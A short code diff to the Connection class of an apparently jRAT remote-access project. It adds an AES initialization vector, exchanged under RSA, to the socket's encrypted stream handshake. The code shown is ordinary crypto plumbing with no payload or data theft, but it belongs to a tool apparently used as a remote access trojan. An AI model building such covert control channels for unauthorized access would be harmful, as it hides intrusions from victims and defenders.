@@ -15,6 +15,7 @@ import java.util.Locale;
 import javax.crypto.Cipher;
 import javax.crypto.CipherInputStream;
 import javax.crypto.CipherOutputStream;
+import javax.crypto.spec.IvParameterSpec;
 import javax.crypto.spec.SecretKeySpec;
 
 import se.jrat.common.ConnectionCodes;
@@ -97,15 +98,20 @@ public class Connection implements Runnable {
 			pubKey = exchanger.getRemoteKey();
 			exchanger.writePublicKey();
 			
-			int len = dis.readInt();
-			byte[] encKey = new byte[len];
+			int keylen = dis.readInt();
+			int ivlen = dis.readInt();
+			byte[] encKey = new byte[keylen];
+			byte[] biv = new byte[ivlen];
 			dis.readFully(encKey);
+			dis.readFully(biv);
 			Main.aesKey = Crypto.decrypt(encKey, Main.getKeyPair().getPrivate(), "RSA");
+			biv = Crypto.decrypt(biv, Main.getKeyPair().getPrivate(), "RSA");
 					
 			SecretKeySpec secretKey = new SecretKeySpec(Main.aesKey, "AES");
+			IvParameterSpec iv = new IvParameterSpec(biv);
 						
-			Cipher inCipher = CryptoUtils.getStreamCipher(Cipher.DECRYPT_MODE, secretKey);
-			Cipher outCipher = CryptoUtils.getStreamCipher(Cipher.ENCRYPT_MODE, secretKey);
+			Cipher inCipher = CryptoUtils.getStreamCipher(Cipher.DECRYPT_MODE, secretKey, iv);
+			Cipher outCipher = CryptoUtils.getStreamCipher(Cipher.ENCRYPT_MODE, secretKey, iv);
 			
 			Connection.inputStream = new CipherInputStream(socket.getInputStream(), inCipher);
 			Connection.outputStream = new CipherOutputStream(socket.getOutputStream(), outCipher);
